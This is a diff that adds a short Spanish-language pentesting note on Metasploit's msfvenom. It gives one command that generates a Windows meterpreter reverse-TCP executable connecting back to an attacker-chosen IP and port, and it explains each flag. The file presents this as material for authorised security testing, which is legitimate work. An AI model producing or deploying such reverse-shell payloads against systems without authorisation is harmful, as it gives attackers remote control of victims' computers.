@@ -1,0 +1,25 @@
+****MSFVENOM****
+
+Explicación de msfvenom:
+msfvenom es una herramienta de Metasploit que se usa para generar payloads personalizados, que son piezas de código malicioso que se pueden utilizar en diferentes tipos de ataques. Estos payloads pueden incluir código para abrir una puerta trasera en una computadora o para ejecutar comandos en el sistema comprometido.
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Ejemplo de Generación de Payload con msfvenom:
+Supongamos que deseas generar un payload de shell reverso en formato de archivo ejecutable de Windows (.exe) que se conecte a tu dirección IP y puerto. Aquí tienes un ejemplo:
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=tu_direccion_ip LPORT=puerto -f exe > payload.exe
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+-p: Indica el payload que deseas generar. En este caso, es un shell reverso de Windows.
+
+LHOST: Reemplaza tu_direccion_ip con tu dirección IP.
+
+LPORT: Reemplaza puerto con el número de puerto en el que deseas recibir la conexión.
+
+-f exe: Indica el formato del archivo resultante (archivo ejecutable de Windows).
+
+> payload.exe: Redirige la salida al archivo payload.exe.
+
+Después de ejecutar este comando, tendrás un archivo payload.exe que contiene el payload generado. Este archivo podría usarse en pruebas de seguridad y pruebas de penetración en sistemas que tengas permiso para evaluar.
